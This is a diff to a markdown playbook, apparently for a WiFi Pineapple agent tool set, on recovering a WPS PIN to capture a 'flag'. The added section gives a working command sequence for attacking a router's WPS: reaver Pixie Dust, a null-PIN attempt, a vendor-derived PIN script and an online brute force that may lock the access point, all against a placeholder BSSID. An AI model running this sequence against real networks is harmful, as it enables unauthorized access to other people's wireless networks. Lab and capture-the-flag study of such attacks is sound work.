@@ -1,5 +1,7 @@
 # WPS PIN flag — WPS is on, brute the PIN
 
+**Verified against:** reaver 1.6.6 as of 2026-Q3
+
 Reaver, Pixie Dust, null-PIN, vendor-derived PIN. Order matters.
 
 ## Recognition
@@ -43,6 +45,33 @@ run_sequence([
      "bssid": "AA:BB:CC:DD:EE:FF",
      "timeout_s": 3600},
 ])
+```
+
+## MCP mapping / fallback
+
+None of `wps_pixiedust`, `wps_reaver_pin`, `wps_vendor_pin_derive`, or
+`wps_reaver_online` are wired as MCP tools in `src/` — WPS is out of
+scope for the current Pineapple API/SSH surface. Drive the on-host
+tools directly.
+
+**Fallback shell chain:**
+
+```bash
+# 1. Pixie Dust (offline)
+sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -K 1 -N -vv
+#   or:   pixiewps -e <pke> -r <pkr> -s <ehash1> -z <ehash2> \
+#                  -a <authkey> -n <enonce>
+
+# 2. Null-PIN attempt
+sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -p '' -vv
+
+# 3. Vendor-derived PIN (Belkin/D-Link/TP-Link etc.)
+#    Compute the candidate PIN offline first, then try it.
+python3 vendor-pin-derive.py --mac AA:BB:CC:DD:EE:FF --vendor belkin
+sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -p <derived> -vv
+
+# 4. Online brute — slow, may lock the AP
+sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -vv -N -L
 ```
 
 ## The flag surface
